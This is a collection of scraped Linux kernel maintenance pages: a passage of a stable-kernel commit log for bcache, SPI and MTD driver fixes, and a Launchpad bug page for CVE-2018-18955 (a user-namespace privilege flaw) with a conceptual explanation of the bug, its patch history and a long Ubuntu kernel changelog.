journal replay, so we need to count these dirty keys even
device in clean status, otherwise after writeback, the amount
of dirty data would be incorrect.
Signed-off-by: Tang Junhui
Cc: stable@vger.kernel.org
Signed-off-by: Coly Li
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 0d0bac807a447d205ff01b551aae067d69d7d19d
Author: Tang Junhui
Date: Mon Oct 8 20:41:08 2018 +0800
bcache: trace missed reading by cache\_missed
commit 502b291568fc7faf1ebdb2c2590f12851db0ff76 upstream.
Missed reading IOs are identified by s->cache\_missed, not the
s->cache\_miss, so in trace\_bcache\_read() using trace\_bcache\_read
to identify whether the IO is missed or not.
Signed-off-by: Tang Junhui
Cc: stable@vger.kernel.org
Signed-off-by: Coly Li
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 4588df8e529c2aef65d0fd312ab4c42f40a579e1
Author: Rafał Miłecki
Date: Thu Oct 11 09:40:22 2018 +0200
spi: bcm-qspi: fix calculation of address length
commit 0976eda7915507fe94e07870c19d717c9994b57a upstream.
During implementation of the new API bcm\_qspi\_bspi\_set\_flex\_mode() has
been modified breaking calculation of address length. An unnecessary
multiplication was added breaking flash reads.
Fixes: 5f195ee7d830 ("spi: bcm-qspi: Implement the spi\_mem interface")
Signed-off-by: Rafał Miłecki
Reviewed-by: Boris Brezillon
Signed-off-by: Mark Brown
Cc: stable@vger.kernel.org
Signed-off-by: Greg Kroah-Hartman
commit af70ba70b95e4f0f35ad1aa568fb96f43f2dd3f6
Author: Rafał Miłecki
Date: Thu Oct 11 09:42:17 2018 +0200
spi: bcm-qspi: switch back to reading flash using smaller chunks
commit 940ec770c295682993d1cccce3081fd7c74fece8 upstream.
Fixing/optimizing bcm\_qspi\_bspi\_read() performance introduced two
changes:
1) It added a loop to read all requested data using multiple BSPI ops.
2) It bumped max size of a single BSPI block request from 256 to 512 B.
The later change resulted in occasional BSPI timeouts causing a
regression.
For some unknown reason hardware doesn't always handle reads as expected
when using 512 B chunks. In such cases it may happen that BSPI returns
amount of requested bytes without the last 1-3 ones. It provides the
remaining bytes later but doesn't raise an interrupt until another LR
start.
Switching back to 256 B reads fixes that problem and regression.
Fixes: 345309fa7c0c ("spi: bcm-qspi: Fix bcm\_qspi\_bspi\_read() performance")
Signed-off-by: Rafał Miłecki
Signed-off-by: Mark Brown
Cc: stable@vger.kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 9b86e6f061276b04432e1b20113f4f59e524236d
Author: Chuanhua Han
Date: Thu Aug 30 16:43:24 2018 +0800
spi: spi-mem: Adjust op len based on message/transfer size limitations
commit e757996cafbeb6b71234a17130674bcd8f44c59e upstream.
We need that to adjust the len of the 2nd transfer (called data in
spi-mem) if it's too long to fit in a SPI message or SPI transfer.
Fixes: c36ff266dc82 ("spi: Extend the core to ease integration of SPI memory controllers")
Cc:
Signed-off-by: Chuanhua Han
Reviewed-by: Boris Brezillon
Signed-off-by: Mark Brown
Signed-off-by: Greg Kroah-Hartman
commit 056a4dd50034a7f1012fd62d027295e4c5338c96
Author: Ahmad Fatoum
Date: Fri Sep 21 11:32:53 2018 +0200
mtd: spi-nor: fsl-quadspi: Don't let -EINVAL on the bus
commit 000412276370a9bcfec73b3752ceefd9a927f1db upstream.
fsl\_qspi\_get\_seqid() may return -EINVAL, but fsl\_qspi\_init\_ahb\_read()
doesn't check for error codes with the result that -EINVAL could find
itself signalled over the bus.
In conjunction with the LS1046A SoC's A-009283 errata
("Illegal accesses to SPI flash memory can result in a system hang")
this illegal access to SPI flash memory results in a system hang
if userspace attempts reading later on.
Avoid this by always checking fsl\_qspi\_get\_seqid()'s return value
and bail out otherwise.
Fixes: e46ecda764dc ("mtd: spi-nor: Add Freescale QuadSPI driver")
Cc: stable@vger.kernel.org
Signed-off-by: Ahmad Fatoum
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 0368e0a3ab70b340ef8870bd764116155247a3c7
Author: Mika Westerberg
Date: Thu Aug 30 11:42:57 2018 +0300
mtd: spi-nor: intel-spi: Add support for Intel Ice Lake SPI serial flash
commit 42460c31ae96cbad5ae226ee6c10bd8d70d764ae upstream.
Intel Ice Lake exposes the SPI serial flash controller as a PCI device
in the same way than Intel Denverton. Add Ice Lake SPI serial flash PCI
ID to the driver list of supported devices.
Signed-off-by: Mika Westerberg
Acked-by: Marek Vasut
Cc: stable@vger.kernel.org
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 82a401cad1be71ea67e4ff384694341fa95ea000
Author: Liu Xiang
Date: Tue Aug 28 22:32:57 2018 +0800
mtd: spi-nor: fsl-quadspi: fix read error for flash size larger than 16MB
commit 41fe242979e463d6ad251077ded01b825a330b7e upstream.
If the size of spi-nor flash is larger than 16MB, the read\_opcode
is set to SPINOR\_OP\_READ\_1\_1\_4\_4B, and fsl\_qspi\_get\_seqid() will
return -EINVAL when cmd is SPINOR\_OP\_READ\_1\_1\_4\_4B. This can
cause read operation fail.
Fixes: e46ecda764dc ("mtd: spi-nor: Add Freescale QuadSPI driver")
Cc:
Signed-off-by: Liu Xiang
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 57459faa2fbe1fe0a0886c179a9bf87c4f12a132
Author: Miquel Raynal
Date: Wed Oct 3 11:05:04 2018 +0200
mtd: rawnand: marvell: fix the IRQ handler complete() condition
commit 53c83b59759c1ee213f5ffa194909daee8902a28 upstream.
With the current implementation, the complete() in the IRQ handler is
supposed to be called only if the register status has one or the other
RDY bit set. Other events might trigger an interrupt as well if
enabled, but should not end-up with a complete() call.
For this purpose, the code was checking if the other bits were set, in
this case complete() was not called. This is wrong as two events might
happen in a very tight time-frame and if the NDSR status read reports
two bits set (eg. RDY(0) and RDDREQ) at the same time, complete() was
not called.
This logic would lead to timeouts in marvell\_nfc\_wait\_op() and has
been observed on PXA boards (NFCv1) in the Hamming write path.
Fixes: 02f26ecf8c77 ("mtd: nand: add reworked Marvell NAND controller driver")
Cc: stable@vger.kernel.org
Reported-by: Daniel Mack
Signed-off-by: Miquel Raynal
Tested-by: Daniel Mack
Signed-off-by: Greg Kroah-Hartman


=== Content from bugs.chromium.org_e0f80fec_20250126_033832.html ===



=== Content from bugs.launchpad.net_d844931d_20250126_033834.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[linux package](https://launchpad.net/ubuntu/%2Bsource/linux)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/linux)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/linux)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/linux)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/linux)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/linux)

# CVE-2018-18955: nested user namespaces with more than five extents incorrectly grant privileges over inode

Bug #1801924 reported by
[Christian Brauner](https://launchpad.net/~cbrauner)
on 2018-11-06

[268](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [linux (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux "Latest release: 6.12.0-12.12, uploaded to main on 2025-01-22 14:57:10.708421+00:00 by Paolo Pisati (p-pisati), maintained by Ubuntu Kernel Team (kernel-team)") | Fix Released | High | Unassigned |  |
|  | [Bionic](https://bugs.launchpad.net/ubuntu/bionic/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [Cosmic](https://bugs.launchpad.net/ubuntu/cosmic/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [Disco](https://bugs.launchpad.net/ubuntu/disco/%2Bsource/linux) | Fix Released | High | Unassigned |  |

### Bug Description

Jann Horn reported that nested user namespaces with more than five mappings allow gaining privilege over an inode.

Here is my write up of how this happens:

Currently, the forward map and reverse map are copied and sorted at the same time before necessary updates to the forward map have been performed. This has the consequence that the forward map receives the necessary updates while the reverse map does not leaving it with invalid data. Specifically, this means that the lower ids of the forward mapping will be correctly mapped to appropriate kernel ids, while the lower ids of the reverse mapping will not.

This breaks inode\_owner\_or\_capable() and privileged\_wrt\_inode\_uidgid() which call helpers that need to access the reverse mapping. Thus, a process can incorrectly appear to be capable relative to an inode.

Note that the sorting logic is only triggered when more than five extents are specified and when user namespaces are nested. Hence, only containers with complex mappings in nested user namespaces are affected.

To fix this issue we need to ensures that the translation happens for both the forward and reverse mappings. First, the forward mappings are sorted and its lower ids translated into kernel ids. After this the forward mapping is copied and into the reverse mapping and the reverse mappings sorted.

A proposed patch is appended here.

See [original description](comments/0)

Tags:

[patch](/ubuntu/%2Bsource/linux/%2Bbugs?field.tag=patch)
[verification-done-bionic](/ubuntu/%2Bsource/linux/%2Bbugs?field.tag=verification-done-bionic)
[cscc](/ubuntu/%2Bsource/linux/%2Bbugs?field.tag=cscc)
[verification-done-cosmic](/ubuntu/%2Bsource/linux/%2Bbugs?field.tag=verification-done-cosmic)

## CVE References

* [2018-18653](/bugs/cve/2018-18653 "The Linux kernel, as used in Ubuntu 1...")
* [2018-18955](/bugs/cve/2018-18955 "In the Linux kernel 4.15.x through 4....")
* [2018-6559](/bugs/cve/2018-6559 "The Linux kernel, as used in Ubuntu 1...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2018-11-06: |  |  | [#1](/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/1) |
| --- | --- | --- | --- |

* [v1-0001-userns-defer-setting-up-reverse-mappings.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Battachment/5209678/%2Bfiles/v1-0001-userns-defer-setting-up-reverse-mappings.patch)
  [Edit](/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Battachment/5209678)
  (3.6 KiB,
  text/plain)

[Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner)
on 2018-11-06

| **description**: | updated |
| --- | --- |
| **description**: | updated |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2018-11-06: |  |  | [#2](/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/2) |
| --- | --- | --- | --- |

+1

+1

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2018-11-10: |  |  | [#3](/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/3) |
| --- | --- | --- | --- |

Please backport:

<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd>

Please backport:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd

[Stéphane Graber (stgraber)](https://launchpad.net/~stgraber)
on 2018-11-11

| Changed in linux (Ubuntu): | |
| --- | --- |
| **importance**: | Undecided → High |
| **status**: | New → Triaged |

[Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks)
on 2018-11-13

| **information type**: | Private Security → Public Security |
| --- | --- |

[Ubuntu Foundations Team Bug Bot (crichton)](https://launchpad.net/~crichton)
on 2018-11-13

| **tags**: | added: patch |
| --- | --- |

[Thadeu Lima de Souza Cascardo (cascardo)](https://launchpad.net/~cascardo)
on 2018-11-14

| Changed in linux (Ubuntu Cosmic): | |
| --- | --- |
| **status**: | New → Fix Committed |

[Thadeu Lima de Souza Cascardo (cascardo)](https://launchpad.net/~cascardo)
on 2018-11-15

| Changed in linux (Ubuntu Bionic): | |
| --- | --- |
| **status**: | New → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brad Figg (brad-figg)](https://launchpad.net/~brad-figg) wrote on 2018-11-15: |  |  | [#4](/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/4) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-cosmic' to 'verification-done-cosmic'. If the problem still exists, change the tag 'verification-needed-cosmic' to 'verification-failed-cosmic'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-cosmic' to 'verification-done-cosmic'. If the problem still exists, change the tag 'verification-needed-cosmic' to 'verification-failed-cosmic'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

| **tags**: | added: verification-needed-cosmic |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brad Figg (brad-figg)](https://launchpad.net/~brad-figg) wrote on 2018-11-16: |  |  | [#5](/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/5) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-bionic' to 'verification-done-bionic'. If the problem still exists, change the tag 'verification-needed-bionic' to 'verification-failed-bionic'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-bionic' to 'verification-done-bionic'. If the problem still exists, change the tag 'verification-needed-bionic' to 'verification-failed-bionic'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

| **tags**: | added: verification-needed-bionic |
| --- | --- |

[Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner)
on 2018-11-21

| **tags**: | added: verification-done-bionic verification-done-cosmicremoved: verification-needed-bionic verification-needed-cosmic |
| --- | --- |

[Seth Forshee (sforshee)](https://launchpad.net/~sforshee)
on 2018-11-27

| Changed in linux (Ubuntu Disco): | |
| --- | --- |
| **status**: | Triaged → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2018-12-03: |  |  | [#6](/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/6) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/6/%2Bdownload) (39.7 KiB)

This bug was fixed in the package linux - 4.18.0-12.13

---------------

linux (4.18.0-12.13) cosmic; urgency=medium

\* linux: 4.18.0-12.13 -proposed tracker (LP: [#1802743](/bugs/1802743))

\* [FEAT] Guest-dedicated Crypto Adapters (LP: [#1787405](/bugs/1787405))

    - s390/zcrypt: Add ZAPQ inline function.

    - s390/zcrypt: Review inline assembler constraints.

    - s390/zcrypt: Integrate ap\_asm.h into include/asm/ap.h.

    - s390/zcrypt: fix ap\_instructions\_available() returncodes

    - KVM: s390: vsie: simulate VCPU SIE entry/exit

    - KVM: s390: introduce and use KVM\_REQ\_VSIE\_RESTART

    - KVM: s390: refactor crypto initialization

    - s390: vfio-ap: base implementation of VFIO AP device driver

    - s390: vfio-ap: register matrix device with VFIO mdev framework

    - s390: vfio-ap: sysfs interfaces to configure adapters

    - s390: vfio-ap: sysfs interfaces to configure domains

    - s390: vfio-ap: sysfs interfaces to configure control domains

    - s390: vfio-ap: sysfs interface to view matrix mdev matrix

    - KVM: s390: interface to clear CRYCB masks

    - s390: vfio-ap: implement mediated device open callback

    - s390: vfio-ap: implement VFIO\_DEVICE\_GET\_INFO ioctl

    - s390: vfio-ap: zeroize the AP queues

    - s390: vfio-ap: implement VFIO\_DEVICE\_RESET ioctl

    - KVM: s390: Clear Crypto Control Block when using vSIE

    - KVM: s390: vsie: Do the CRYCB validation first

    - KVM: s390: vsie: Make use of CRYCB FORMAT2 clear

    - KVM: s390: vsie: Allow CRYCB FORMAT-2

    - KVM: s390: vsie: allow CRYCB FORMAT-1

    - KVM: s390: vsie: allow CRYCB FORMAT-0

    - KVM: s390: vsie: allow guest FORMAT-0 CRYCB on host FORMAT-1

    - KVM: s390: vsie: allow guest FORMAT-1 CRYCB on host FORMAT-2

    - KVM: s390: vsie: allow guest FORMAT-0 CRYCB on host FORMAT-2

    - KVM: s390: device attrs to enable/disable AP interpretation

    - KVM: s390: CPU model support for AP virtualization

    - s390: doc: detailed specifications for AP virtualization

    - KVM: s390: fix locking for crypto setting error path

    - KVM: s390: Tracing APCB changes

    - s390: vfio-ap: setup APCB mask using KVM dedicated function

    - [Config:] Enable CONFIG\_S390\_AP\_IOMMU and set CONFIG\_VFIO\_AP to module.

\* Bypass of mount visibility through userns + mount propagation (LP: [#1789161](/bugs/1789161))

    - mount: Retest MNT\_LOCKED in do\_umount

    - mount: Don't allow copying MNT\_UNBINDABLE|MNT\_LOCKED mounts

\* CVE-2018-18955: nested user namespaces with more than five extents

    incorrectly grant privileges over inode (LP: [#1801924](/bugs/1801924)) // CVE-2018-18955

    - userns: also map extents in the reverse map to kernel IDs

\* kdump fail due to an IRQ storm (LP: [#1797990](/bugs/1797990))

    - SAUCE: x86/PCI: Export find\_cap() to be used in early PCI code

    - SAUCE: x86/quirks: Add parameter to clear MSIs early on boot

    - SAUCE: x86/quirks: Scan all busses for early PCI quirks

\* crash in ENA driver on removing an interface (LP: [#1802341](/bugs/1802341))

    - SAUCE: net: ena: fix crash during ena\_remove()

\* Ubuntu 18.04.1 - [s390x] Kernel panic while stressing network bonding

    (LP: [#1797367](/bugs/1797367))

    - s390/qeth: reduce hard-coded access to ccw channels

    - s390/qeth: sanitize strings in debug messages

\* Add checksum offload and T...

This bug was fixed in the package linux - 4.18.0-12.13
---------------
linux (4.18.0-12.13) cosmic; urgency=medium
\* linux: 4.18.0-12.13 -proposed tracker (LP: #1802743)
\* [FEAT] Guest-dedicated Crypto Adapters (LP: #1787405)
- s390/zcrypt: Add ZAPQ inline function.
- s390/zcrypt: Review inline assembler constraints.
- s390/zcrypt: Integrate ap\_asm.h into include/asm/ap.h.
- s390/zcrypt: fix ap\_instructions\_available() returncodes
- KVM: s390: vsie: simulate VCPU SIE entry/exit
- KVM: s390: introduce and use KVM\_REQ\_VSIE\_RESTART
- KVM: s390: refactor crypto initialization
- s390: vfio-ap: base implementation of VFIO AP device driver
- s390: vfio-ap: register matrix device with VFIO mdev framework
- s390: vfio-ap: sysfs interfaces to configure adapters
- s390: vfio-ap: sysfs interfaces to configure domains
- s390: vfio-ap: sysfs interfaces to configure control domains
- s390: vfio-ap: sysfs interface to view matrix mdev matrix
- KVM: s390: interface to clear CRYCB masks
- s390: vfio-ap: implement mediated device open callback
- s390: vfio-ap: implement VFIO\_DEVICE\_GET\_INFO ioctl
- s390: vfio-ap: zeroize the AP queues
- s390: vfio-ap: implement VFIO\_DEVICE\_RESET ioctl
- KVM: s390: Clear Crypto Control Block when using vSIE
- KVM: s390: vsie: Do the CRYCB validation first
- KVM: s390: vsie: Make use of CRYCB FORMAT2 clear
- KVM: s390: vsie: Allow CRYCB FORMAT-2
- KVM: s390: vsie: allow CRYCB FORMAT-1
- KVM: s390: vsie: allow CRYCB FORMAT-0
- KVM: s390: vsie: allow guest FORMAT-0 CRYCB on host FORMAT-1
- KVM: s390: vsie: allow guest FORMAT-1 CRYCB on host FORMAT-2
- KVM: s390: vsie: allow guest FORMAT-0 CRYCB on host FORMAT-2
- KVM: s390: device attrs to enable/disable AP interpretation
- KVM: s390: CPU model support for AP virtualization
- s390: doc: detailed specifications for AP virtualization
- KVM: s390: fix locking for crypto setting error path
- KVM: s390: Tracing APCB changes
- s390: vfio-ap: setup APCB mask using KVM dedicated function
- [Config:] Enable CONFIG\_S390\_AP\_IOMMU and set CONFIG\_VFIO\_AP to module.
\* Bypass of mount visibility through userns + mount propagation (LP: #1789161)
- mount: Retest MNT\_LOCKED in do\_umount
- mount: Don't allow copying MNT\_UNBINDABLE|MNT\_LOCKED mounts
\* CVE-2018-18955: nested user namespaces with more than five extents
incorrectly grant privileges over inode (LP: #1801924) // CVE-2018-18955
- userns: also map extents in the reverse map to kernel IDs
\* kdump fail due to an IRQ storm (LP: #1797990)
- SAUCE: x86/PCI: Export find\_cap() to be used in early PCI code
- SAUCE: x86/quirks: Add parameter to clear MSIs early on boot
- SAUCE: x86/quirks: Scan all busses for early PCI quirks
\* crash in ENA driver on removing an interface (LP: #1802341)
- SAUCE: net: ena: fix crash during ena\_remove()
\* Ubuntu 18.04.1 - [s390x] Kernel panic while stressing network bonding
(LP: #1797367)
- s390/qeth: reduce hard-coded access to ccw channels
- s390/qeth: sanitize strings in debug messages
\* Add checksum offload and TSO support for HiNIC adapters (LP: #1800664)
- net-next/hinic: add checksum offload and TSO support
\* smartpqi updates for ubuntu 18.04.2 (LP: #1798208)
- scsi: smartpqi: improve handling for sync requests
- scsi: smartpqi: improve error checking for sync requests
- scsi: smartpqi: add inspur advantech ids
- scsi: smartpqi: fix critical ARM issue reading PQI index registers
- scsi: smartpqi: bump driver version to 1.1.4-130
\* [GLK/CLX] Enhanced IBRS (LP: #1786139)
- x86/speculation: Remove SPECTRE\_V2\_IBRS in enum spectre\_v2\_mitigation
- x86/speculation: Support Enhanced IBRS on future CPUs
\* Enable keyboard wakeup for S2Idle laptops (LP: #1798552)
- Input: i8042 - enable keyboard wakeups by default when s2idle is used
\* Overlayfs in user namespace leaks directory content of inaccessible
directories (LP: #1793458) // CVE-2018-6559
- SAUCE: overlayfs: ensure mounter privileges when reading directories
\* Update ENA driver to version 2.0.1K (LP: #1798182)
- net: ena: remove ndo\_poll\_controller
- net: ena: fix auto casting to boolean
- net: ena: minor performance improvement
- net: ena: complete host info to match latest ENA spec
- net: ena: introduce Low Latency Queues data structures according to ENA spec
- net: ena: add functions for handling Low Latency Queues in ena\_com
- net: ena: add functions for handling Low Latency Queues in ena\_netdev
- net: ena: use CSUM\_CHECKED device indication to report skb's checksum status
- net: ena: explicit casting and initialization, and clearer error handling
- net: ena: limit refill Rx threshold to 256 to avoid latency issues
- net: ena: change rx copybreak default to reduce kernel memory pressure
- net: ena: remove redundant parameter in ena\_com\_admin\_init()
- net: ena: update driver version to 2.0.1
- net: ena: fix indentations in ena\_defs for better readability
- net: ena: Fix Kconfig dependency on X86
- net: ena: enable Low Latency Queues
- net: ena: fix compilation error in xtensa architecture
\* Cosmic update: 4.18.17 upstream stable release (LP: #1802119)
- xfrm: Validate address prefix lengths in the xfrm selector.
- xfrm6: call kfree\_skb when skb is toobig
- xfrm: reset transport header back to network header after all input
transforms ahave been applied
- xfrm: reset crypto\_done when iterating over multiple input xfrms
- mac80211: Always report TX status
- cfg80211: reg: Init wiphy\_idx in regulatory\_hint\_core()
- mac80211: fix pending queue hang due to TX\_DROP
- cfg80211: Address some corner cases in scan result channel updating
- mac80211: TDLS: fix skb queue/priority assignment
- mac80211: fix TX status reporting for ieee80211s
- ARM: 8799/1: mm: fix pci\_ioremap\_io() offset check
- xfrm: validate template mode
- drm/i2c: tda9950: fix timeout counter check
- drm/i2c: tda9950: set MAX\_RETRIES for errors only
- netfilter: bridge: Don't sabotage nf\_hook calls from an l3mdev
- netfilter: conntrack: get rid of double sizeof
- arm64: hugetlb: Fix handling of young ptes
- ARM: dts: BCM63xx: Fix incorrect interrupt specifiers
- net: macb: Clean 64b dma addresses if they are not detected
- soc: fsl: qbman: qman: avoid allocating from non existing gen\_pool
- soc: fsl: qe: Fix copy/paste bug in ucc\_get\_tdm\_sync\_shift()
- nl80211: Fix possible Spectre-v1 for NL80211\_TXRATE\_HT
- mac80211\_hwsim: fix locking when iterating radios during ns exit
- mac80211\_hwsim: fix race in radio destruction from netlink notifier
- mac80211\_hwsim: do not omit multicast announce of first added radio
- Bluetooth: SMP: fix crash in unpairing
- pxa168fb: prepare the clock
- qed: Avoid implicit enum conversion in qed\_set\_tunn\_cls\_info
- qed: Fix mask parameter in qed\_vf\_prep\_tunn\_req\_tlv
- qed: Avoid implicit enum conversion in qed\_roce\_mode\_to\_flavor
- qed: Avoid constant logical operation warning in qed\_vf\_pf\_acquire
- qed: Avoid implicit enum conversion in qed\_iwarp\_parse\_rx\_pkt
- nl80211: Fix possible Spectre-v1 for CQM RSSI thresholds
- scsi: qedi: Initialize the stats mutex lock
- rxrpc: Fix checks as to whether we should set up a new call
- rxrpc: Fix RTT gathering
- rxrpc: Fix transport sockopts to get IPv4 errors on an IPv6 socket
- rxrpc: Fix error distribution
- netfilter: nft\_set\_rbtree: add missing rb\_erase() in GC routine
- netfilter: avoid erronous array bounds warning
- asix: Check for supported Wake-on-LAN modes
- ax88179\_178a: Check for supported Wake-on-LAN modes
- lan78xx: Check for supported Wake-on-LAN modes
- sr9800: Check for supported Wake-on-LAN modes
- r8152: Check for supported Wake-on-LAN Modes
- smsc75xx: Check for Wake-on-LAN modes
- smsc95xx: Check for Wake-on-LAN modes
- cfg80211: fix use-after-free in reg\_process\_hint()
- KVM: nVMX: Do not expose MPX VMX controls when guest MPX disabled
- KVM: x86: Do not use kvm\_x86\_ops->mpx\_supported() directly
- KVM: nVMX: Fix emulation of VM\_ENTRY\_LOAD\_BNDCFGS
- perf/core: Fix perf\_pmu\_unregister() locking
- perf/x86/intel/uncore: Use boot\_cpu\_data.phys\_proc\_id instead of hardcorded
physical package ID 0
- perf/ring\_buffer: Prevent concurent ring buffer access
- perf/x86/intel/uncore: Fix PCI BDF address of M3UPI on SKX
- perf/x86/amd/uncore: Set ThreadMask and SliceMask for L3 Cache perf events
- thunderbolt: Do not handle ICM events after domain is stopped
- thunderbolt: Initialize after IOMMUs
- net: fec: fix rare tx timeout
- declance: Fix continuation with the adapter identification message
- RISCV: Fix end PFN for low memory
- Revert "serial: 8250\_dw: Fix runtime PM handling"
- locking/ww\_mutex: Fix runtime warning in the WW mutex selftest
- drm/amd/display: Signal hw\_done() after waiting for flip\_done()
- be2net: don't flip hw\_features when VXLANs are added/deleted
- powerpc/numa: Skip onlining a offline node in kdump path
- net: cxgb3\_main: fix a missing-check bug
- yam: fix a missing-check bug
- ocfs2: fix crash in ocfs2\_duplicate\_clusters\_by\_page()
- mm/gup\_benchmark: fix unsigned comparison to zero in \_\_gup\_benchmark\_ioctl
- mm/migrate.c: split only transparent huge pages when allocation fails
- x86/paravirt: Fix some warning messages
- clk: mvebu: armada-37xx-periph: Remove unused var num\_parents
- libertas: call into generic suspend code before turning off power
- perf report: Don't try to map ip to invalid map
- tls: Fix improper revert in zerocopy\_from\_iter
- HID: i2c-hid: Remove RESEND\_REPORT\_DESCR quirk and its handling
- compiler.h: Allow arch-specific asm/compiler.h
- ARM: dts: imx53-qsb: disable 1.2GHz OPP
- perf python: Use -Wno-redundant-decls to build with PYTHON=python3
- perf record: Use unmapped IP for inline callchain cursors
- rxrpc: Don't check RXRPC\_CALL\_TX\_LAST after calling rxrpc\_rotate\_tx\_window()
- rxrpc: Carry call state out of locked section in rxrpc\_rotate\_tx\_window()
- rxrpc: Only take the rwind and mtu values from latest ACK
- rxrpc: Fix connection-level abort handling
- KVM: x86: support CONFIG\_KVM\_AMD=y with CONFIG\_CRYPTO\_DEV\_CCP\_DD=m
- net: ena: fix warning in rmmod caused by double iounmap
- net: ena: fix rare bug when failed restart/resume is followed by driver
removal
- net: ena: fix NULL dereference due to untimely napi initialization
- gpio: Assign gpio\_irq\_chip::parents to non-stack pointer
- IB/mlx5: Unmap DMA addr from HCA before IOMMU
- rds: RDS (tcp) hangs on sendto() to unresponding address
- selftests: rtnetlink.sh explicitly requires bash.
- selftests: udpgso\_bench.sh explicitly requires bash
- vmlinux.lds.h: Fix incomplete .text.exit discards
- vmlinux.lds.h: Fix linker warnings about orphan .LPBX sections
- afs: Fix cell proc list
- fs/fat/fatent.c: add cond\_resched() to fat\_count\_free\_clusters()
- Revert "mm: slowly shrink slabs with a relatively small number of objects"
- Revert "netfilter: ipv6: nf\_defrag: drop skb dst before queueing"
- perf tools: Disable parallelism for 'make clean'
- bridge: do not add port to router list when receives query with source
0.0.0.0
- ipv6: mcast: fix a use-after-free in inet6\_mc\_check
- ipv6/ndisc: Preserve IPv6 control buffer if protocol error handlers are
called
- ipv6: rate-limit probes for neighbourless routes
- llc: set SOCK\_RCU\_FREE in llc\_sap\_add\_socket()
- net: fec: don't dump RX FIFO register when not available
- net/ipv6: Fix index counter for unicast addresses in in6\_dump\_addrs
- net/mlx5e: fix csum adjustments caused by RXFCS
- net: sched: gred: pass the right attribute to gred\_change\_table\_def()
- net: socket: fix a missing-check bug
- net: stmmac: Fix stmmac\_mdio\_reset() when building stmmac as modules
- net: udp: fix handling of CHECKSUM\_COMPLETE packets
- r8169: fix NAPI handling under high load
- rtnetlink: Disallow FDB configuration for non-Ethernet device
- sctp: fix race on sctp\_id2asoc
- tipc: fix unsafe rcu locking when accessing publication list
- udp6: fix encap return code for resubmitting
- vhost: Fix Spectre V1 vulnerability
- virtio\_net: avoid using netif\_tx\_disable() for serializing tx routine
- ethtool: fix a privilege escalation bug
- bonding: fix length of actor system
- ip6\_tunnel: Fix encapsulation layout
- openvswitch: Fix push/pop ethernet validation
